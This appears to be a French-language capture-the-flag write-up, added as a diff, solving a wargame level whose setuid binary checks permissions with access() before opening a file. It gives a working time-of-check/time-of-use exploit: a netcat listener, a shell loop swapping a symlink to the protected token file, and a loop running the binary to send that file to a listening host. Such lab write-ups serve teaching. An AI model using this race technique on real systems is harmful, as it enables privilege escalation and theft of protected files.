@@ -1,0 +1,116 @@
+$ ls -la
+total 28
+dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
+d--x--x--x  1 root    users     340 Aug 30  2015 ..
+-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
+-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
+-r-x------  1 level10 level10   675 Apr  3  2012 .profile
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+On trouve un fichier binaire et un fichier token qui est bloque 
+
+$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+le binaire semble envoyer un fichier (file) a une adresse host (host)
+
+$ ./level10 token 127.0.0.1
+You don't have access to token
+
+comme attendu nous n'avons pas acces au fichier token
+
+$ ./level10 .profile 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+Si nous mettons un fichier valide, il semblerait qu il faille un recepteur pour ce fichier, le port 6969.
+
+~$ strings level10
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+socket
+fflush
+exit
+htons
+connect
+puts
+__stack_chk_fail
+printf
+__errno_location
+read
+stdout
+inet_addr
+open
+access
+strerror
+__libc_start_main
+write
+GLIBC_2.4
+GLIBC_2.0
+PTRh
+UWVS
+[^_]
+%s file host
+	sends file to host if you have access to it
+Connecting to %s:6969 .. 
+Unable to connect to host %s
+.*( )*.
+Unable to write banner to host %s
+Connected!
+Sending file .. 
+Damn. Unable to open file
+Unable to read from file: %s
+wrote file!
+You don't have access to %s
+
+
+Le binaire verifie si nous avons les droits pour lire le fichier avec access puis tente de l'envoyer à un serveur et pour en afficher 
+le contenu mais comme vu nous n'avons pas les droits sur le fichier token.
+
+avec les informations obtenu et l'information ci dessous obtenue sur le man de access:
+
+Warning: Using access() to check if a user is authorized to,  for
+       example,  open a file before actually doing so using open(2) cre‐
+       ates a security hole, because the user might  exploit  the  short
+       time interval between checking and opening the file to manipulate
+       it.  For this reason, the use  of  this  system  call  should  be
+       avoided.
+
+nous pouvons exploiter cette faille:
+
+on va d'abord utiliser netcat pour ecouter sur le port 6969:
+$ nc -lk 6969
+
+-l pour ecouter sur le port specifie, -k pour rester à l'ecoute après chaque connexion.
+
+on va ensuite ecrire un script qui va spammer la creation d un fichier le supprimer
+puis cree un lien symbolique afin d'exploiter le laps de temps entre ces deux operations
+
+~$ cd /tmp
+/tmp$ vim symlink.sh
+/tmp$ cat symlink.sh
+#!/bin/bash
+
+while true; do
+        touch /tmp/link
+        rm -f /tmp/link
+        ln -s /home/user/level10/token /tmp/link
+        rm -f /tmp/link
+done
+
+D'abord, on cree un fichier dans /tmp pour qu access pense que nous voulons l'ouvrir.
+Puis on le supprime avant de creer un lien symbolique pour qu'open ouvre le fichier token a la place,
+Puis on supprime notre lien symbolique avant de le creer à nouveau via la boucle.
+
+Enfin on cree une autre boucle infinie pour pouvoir executer ~/level10 avec le fichier /tmp/link 
+que nous avons cree encore et encore avec notre script precedent:
+/tmp$ vim spam.sh
+/tmp$ cat spam.sh
+#!/bin/bash
+
+while true; do
+        /home/user/level10/level10 /tmp/link 192.168.56.101
+done
